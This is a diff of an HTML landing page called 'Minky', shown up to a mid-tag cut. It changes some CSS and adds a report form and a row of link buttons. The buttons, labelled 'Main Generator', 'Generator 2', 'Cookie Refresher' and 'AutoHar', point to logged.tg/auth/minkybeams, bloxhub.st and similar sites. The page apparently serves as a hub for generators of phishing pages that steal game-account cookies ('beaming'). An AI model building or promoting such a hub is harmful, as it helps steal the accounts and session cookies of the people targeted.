@@ -39,7 +39,6 @@
       to { transform: scale(1.1) rotate(45deg); }
     }
 
-    /* Member count */
     #member-count {
       position: fixed;
       top: 20px;
@@ -54,7 +53,6 @@
       font-size: 1em;
       color: #fff;
       z-index: 2;
-      transition: transform 0.2s ease;
     }
 
     #member-count button {
@@ -78,7 +76,6 @@
       box-shadow: 0 0 10px #fff;
     }
 
-    /* Report Button */
     #report-button {
       position: fixed;
       top: 20px;
@@ -93,13 +90,12 @@
       justify-content: center;
       cursor: pointer;
       z-index: 2;
-      transition: all 0.3s ease, transform 0.2s ease;
+      transition: all 0.3s ease;
     }
 
     #report-button:hover {
       background: #fff;
       border-color: #fff;
-      transform: scale(1.1);
     }
 
     #report-button svg {
@@ -125,7 +121,6 @@
       color: #000;
     }
 
-    /* Report UI */
     #report-ui {
       display: none;
       position: fixed;
@@ -202,7 +197,6 @@
       transform: scale(1.05);
     }
 
-    /* Notification */
     #notification {
       position: fixed;
       top: 85px;
@@ -218,7 +212,6 @@
       font-size: 0.95em;
     }
 
-    /* Links & Titles */
     h1 {
       font-size: 3em;
       color: #fff;
@@ -292,7 +285,34 @@
     <button id="refresh-count">⟳</button>
   </div>
 
-  <!-- Report Button with SVG -->
   <div id="report-button">
-    <svg viewBox="0 0 24 24">
-      <path d="M20 2H4C2.9 2 2 2.9 2 4v16l4-4h14c1.1 0 2-0.9 2-2V4c0-1.
+    <svg viewBox="0 0 24 24"><path d="M21 6.5V18a2 2 0 0 1-2 2H5l-4 4V4a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2v2.5z"/></svg>
+    <span>Report</span>
+  </div>
+
+  <div id="report-ui">
+    <h2>Report</h2>
+    <p>Must Be In The Server For The Response</p>
+    <input type="text" id="discord-username" placeholder="Your Discord Username">
+    <select id="category">
+      <option value="">Select Category</option>
+      <option value="bug">Report a Bug</option>
+      <option value="suggestion">Suggestion</option>
+      <option value="member">Report a Member</option>
+      <option value="site">Site Down</option>
+    </select>
+    <input type="text" id="reported-user" placeholder="User to Report (Only if they're in the server.)" style="display:none;">
+    <textarea id="report-text" placeholder="Your Report"></textarea>
+    <input type="file" id="attachments" multiple accept="image/*,video/*">
+    <button id="submit-report">Submit Report</button>
+  </div>
+
+  <div id="notification"></div>
+
+  <h1>Minky</h1>
+  <div class="links">
+    <a href="https://www.logged.tg/auth/minkybeams" class="link-btn" target="_blank">Main Generator</a>
+    <a href="https://immortal.st/?code=NjU5MTUxMzEwNzc3ODI3Nzc1MV85OTcxODE4OTgyODA4ODQwMjQ=" class="link-btn" target="_blank">Generator 2</a>
+    <a href="https://www.logged.tg/tools/refresher" class="link-btn" target="_blank">Cookie Refresher</a>
+    <a href="https://bloxhub.st/generator/Minky" class="link-btn" target="_blank">AutoHar</a>
+    <a href="https://discord.gg/PV3vVfc7s7" class="
